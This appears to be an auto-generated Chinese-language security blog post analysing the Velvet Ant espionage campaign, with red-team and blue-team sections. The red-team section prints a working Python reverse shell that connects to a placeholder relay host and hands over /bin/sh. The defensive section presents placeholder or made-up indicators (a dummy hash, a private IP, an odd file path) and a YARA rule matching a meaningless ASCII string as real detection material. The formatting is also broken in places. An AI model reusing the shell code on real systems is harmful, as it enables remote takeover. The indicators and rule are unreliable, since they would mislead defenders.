---
layout: post
title:  "Chinese hackers hijack auth flow, spy on isolated network for a decade"
date:   2026-06-13 19:13:42 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Velvet Ant 攻擊：十年滲透與持續存在

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution) 與 LPE (Local Privilege Escalation)
> * **關鍵技術**: Reverse Shell, SOCKS5 Proxy, FastCGI, PAM (Pluggable Authentication Modules)

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Velvet Ant 攻擊者利用 internet-facing 系統的漏洞，例如 F5 BIG-IP 设备的 zero-day 漏洞，獲得初始訪問權限。
* **攻擊流程圖解**:
  1. 攻擊者利用 internet-facing 系統的漏洞獲得初始訪問權限。
  2. 部署修改過的 GS-Netcat reverse shell，連接到硬編碼的 relay domain，提供加密的遠端 shell 存取。
  3. 利用 systemd 服務或啟動腳本修改實現持續存在。
  4. 安裝自定義的 SOCKS5 代理，實現網路流量隧道，進而存取內部系統。
  5. 修改 Nginx 配置，將請求轉發到 FastCGI 進程，實現遠端執行。
* **受影響元件**: F5 BIG-IP 设备、Nginx、Linux Pluggable Authentication Modules (PAM)

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 需要 internet-facing 系統的訪問權限。
* **Payload 建構邏輯**:

    ```
    
    python
    import socket
    import subprocess
    
    # 建立 reverse shell 連接
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("relay_domain", 8080))
    
    # 執行系統命令
    subprocess.Popen(["/bin/sh", "-i"], stdin=sock, stdout=sock, stderr=sock)
    
    ```
* **繞過技術**: Velvet Ant 攻擊者利用自定義的 SOCKS5 代理和 FastCGI 進程，實現網路流量隧道和遠端執行，繞過傳統的安全防禦。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | relay_domain | /usr/bin/pam_unix.so |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Velvet_Ant {
      meta:
        description = "Velvet Ant 攻擊者自定義的 SOCKS5 代理"
      strings:
        $socks5_proxy = { 53 4f 63 6b 73 35 20 70 72 6f 78 79 }
      condition:
        $socks5_proxy in (0..100)
    }
    
    ```
* **緩解措施**: 更新 F5 BIG-IP 设备的安全補丁，修改 Nginx 配置，禁用 FastCGI 進程，實現多因素驗證和連續監控。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Reverse Shell**: 一種遠端 shell 連接，允許攻擊者遠端控制系統。
* **SOCKS5 Proxy**: 一種網路代理，允許攻擊者實現網路流量隧道。
* **FastCGI**: 一種網路協議，允許攻擊者遠端執行系統命令。
* **PAM (Pluggable Authentication Modules)**: 一種驗證模塊，允許攻擊者實現自定義的驗證機制。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/chinese-hackers-hijack-auth-flow-spy-on-isolated-network-for-a-decade/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1210/)


